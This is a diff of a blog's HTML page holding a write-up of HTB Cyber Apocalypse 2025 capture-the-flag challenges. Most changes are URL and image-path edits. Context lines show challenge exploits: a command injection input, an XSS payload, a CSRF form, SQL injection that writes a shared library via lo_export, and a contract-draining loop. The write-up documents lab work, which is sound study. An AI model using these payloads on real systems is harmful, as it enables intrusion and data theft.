@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
   
     <title>HTB Cyber Apocalypse 2025 Writeup - All Web :: elmosalamy | blog</title>
   
@@ -9,23 +9,23 @@
 <meta name="description" content="This year saw a significant improvement to PwnSec&amp;rsquo;s performance. We moved from 77th last year to achieving 15th this year." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
-<link rel="canonical" href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/" />
+<link rel="canonical" href="/posts/htb-cyber-apocalypse-2025-writeup/" />
 
 
 
 
-<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+<link rel="stylesheet" href="/assets/style.css">
 
-  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
-
-
-
-<link rel="stylesheet" href="//localhost:1313/style.css">
+  <link rel="stylesheet" href="/assets/green.css">
 
 
-<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
 
-  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/green.png">
 
 
 
@@ -37,10 +37,10 @@
 <meta property="og:type" content="article" />
 <meta property="og:title" content="HTB Cyber Apocalypse 2025 Writeup - All Web">
 <meta property="og:description" content="Played with PwnSec and ranked 15th worldwide with 76/77 flags which . This is a summary of my solves during the competition." />
-<meta property="og:url" content="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/" />
+<meta property="og:url" content="/posts/htb-cyber-apocalypse-2025-writeup/" />
 <meta property="og:site_name" content="elmosalamy | blog" />
 
-  <meta property="og:image" content="//localhost:1313/images/htb-2025.png">
+  <meta property="og:image" content="/images/htb-2025.png">
 
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
@@ -139,7 +139,7 @@
     
 <div class="post">
   <h1 class="post-title">
-    <a href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/">HTB Cyber Apocalypse 2025 Writeup - All Web</a></h1>
+    <a href="/posts/htb-cyber-apocalypse-2025-writeup/">HTB Cyber Apocalypse 2025 Writeup - All Web</a></h1>
   <div class="post-meta">
     
       <span class="post-date">
@@ -154,13 +154,13 @@
   
   <span class="post-tags">
     
-    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
     
   </span>
   
 
   
-    <img src="//localhost:1313/images/htb-2025.png" class="post-cover" alt="HTB Cyber Apocalypse 2025 Writeup - All Web" />
+    <img src="/images/htb-2025.png" class="post-cover" alt="HTB Cyber Apocalypse 2025 Writeup - All Web" />
   
 
   
@@ -180,7 +180,6 @@
     <li><a href="#web-aurors-archive---hard">Web: Aurors Archive - Hard</a></li>
     <li><a href="#blockchain-eldorion---very-easy">Blockchain: Eldorion - Very Easy</a></li>
     <li><a href="#blockchain-heliosdex---easy">Blockchain: HeliosDEX - Easy</a></li>
-    <li><a href="#flag">FLAG</a></li>
   </ul>
 </nav>
     </div>
@@ -203,7 +202,7 @@
 </span></span></code></pre></div><p><code>HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_e9f8c148ac7f49bb3d2d00093473056d}</code></p>
 <h2 id="web-whispers-of-the-moonbeam---very-easy">Web: Whispers of The Moonbeam - Very Easy<a href="#web-whispers-of-the-moonbeam---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Simple command injection in the <code>gossip</code> command, some initial attempts:
-<img src="/posts/htb-cyber-apocalypse-2025-writeup/whispers_htb.png"></p>
+<img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/whispers_htb.png"></p>
 <p>We notice <code>gossip</code> displays an <code>ls</code>-like output. Command injection:</p>
 <pre tabindex="0"><code>gossip ; cat flag.txt
 </code></pre><p><code>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_8bafcd34a8f4593225ff0b8ee006ac88}</code></p>
@@ -226,7 +225,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
 </span></span><span style="display:flex;"><span>grpcui -proto .<span style="color:#ae81ff">\c</span>hallenge<span style="color:#ae81ff">\l</span>ive_data.proto  -plaintext 127.0.0.1:50051
 </span></span></code></pre></div><p>It looks like this:
-<img alt="grpc_htb" src="/posts/htb-cyber-apocalypse-2025-writeup/grpc_htb.png"></p>
+<img alt="grpc_htb" src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/grpc_htb.png"></p>
 <p>I set up Wireshark and filtered for messages on <code>tcp/50051</code>, as per the gRPC reference&rsquo;s tip:</p>
 <blockquote>
 <p>If you don’t see packets in HTTP2 protocol, click “Analyze” -&gt; “Decode As…”. Then, add TCP port X with HTTP2 protocol, where X is port of gRPC server (e.g. 8083).</p>
@@ -237,7 +236,7 @@
 <li>We use <code>gopher://</code>, a legacy protocol supported by <code>curl</code> because it allows us to send raw TCP packets over the wire.</li>
 </ol>
 <p>You can see me here doing some debugging with <code>sleep</code> statements. It seemed like the HTTP/2 packet was getting corrupted:
-<img src="/posts/htb-cyber-apocalypse-2025-writeup/gopher_received.png"></p>
+<img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/gopher_received.png"></p>
 <p>We should have <code>PRI</code> not <code>50RI</code> in the output above.</p>
 <p>I tried prepending the <code>gopher://</code> payload with an extra character and it worked. My script:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
@@ -322,7 +321,7 @@
 </span></span></code></pre></div><p>The author probably thought that <code>dump</code> (Convert data to a JSON string) will prevent bypass? Not sure.</p>
 <p>Anyways, we can escape by submitting a bid with the following payload, using single quotes:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&gt;&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span>
-</span></span></code></pre></div><p><img src="/posts/htb-cyber-apocalypse-2025-writeup/submission_xss.png"></p>
+</span></span></code></pre></div><p><img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/submission_xss.png"></p>
 <p>The XSS reflected in <code>/my-submissions</code>, which made it difficult to deliver to admin. I played around with different CSRF techniques to get the admin to poison his own page before visiting it, but all attempts ultimately failed due to <code>SameSite=Lax</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://94.237.58.253:42840/api/submissions&#34;</span>
@@ -527,11 +526,11 @@
 </span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT lo_export(133340, &#39;/tmp/payload.so&#39;)) AS text)&#34;</span>)
 </span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT pg_reload_conf()) AS text)&#34;</span>)
 </span></span></code></pre></div><p>On the next SQL query, we get a hit:
-<img src="/posts/htb-cyber-apocalypse-2025-writeup/aurors_flag.png"></p>
+<img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/aurors_flag.png"></p>
 <p><code>HTB{l00k_0ut_f0r_0auth_155u35}</code></p>
 <blockquote>
 <p>Note: I later confirmed with an HTB admin and he said:
-<img src="/posts/htb-cyber-apocalypse-2025-writeup/intended_aurors.png"></p>
+<img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/intended_aurors.png"></p>
 </blockquote>
 <h2 id="blockchain-eldorion---very-easy">Blockchain: Eldorion - Very Easy<a href="#blockchain-eldorion---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>This was my first time ever working with smart contracts or blockchain challenges. ChatGPT did ease the transition and I realize how similar it is to traditional &ldquo;Web 2.0&rdquo; tasks.</p>
@@ -732,7 +731,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --rpc-url $RPC_URL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><p><img src="/posts/htb-cyber-apocalypse-2025-writeup/blockchain_infinite_eth.png"></p>
+</span></span></code></pre></div><p><img src="posts/HTB%20Cyber%20Apocalypse%202025%20Writeup/blockchain_infinite_eth.png"></p>
 <p>We can see our profits coming while our DHS store remaining untouched:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast balance 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6 --rpc-url $RPC_URL
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">19813764055000000000</span>
@@ -747,8 +746,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - Get flag
 </span></span><span style="display:flex;"><span>Select action <span style="color:#f92672">(</span>enter number<span style="color:#f92672">)</span>: <span style="color:#ae81ff">3</span>
 </span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3<span style="color:#f92672">}</span>
-</span></span></code></pre></div><h2 id="flag">FLAG<a href="#flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p><code>HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}</code></p>
+</span></span></code></pre></div><p><code>HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}</code></p>
 
       </div></div>
 
@@ -761,9 +759,16 @@
     </div>
     <div class="pagination__buttons">
         
+        <span class="button previous">
+            <a href="/posts/novacore-a-never-ending-chain/">
+                <span class="button__icon">←</span>
+                <span class="button__text">[Web] Novacore: A Never-ending Chain (HTB Business CTF)</span>
+            </a>
+        </span>
+        
         
         <span class="button next">
-            <a href="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/">
+            <a href="/posts/hack-my-bot-pwnme-2025-ctf/">
                 <span class="button__text">Hack My Bot Writeup for Beginners (PwnMe 2025 CTF)</span>
                 <span class="button__icon">→</span>
             </a>
@@ -810,8 +815,8 @@
   </div>
 </footer>
 
-<script src="//localhost:1313/assets/main.js"></script>
-<script src="//localhost:1313/assets/prism.js"></script>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
 
 
 
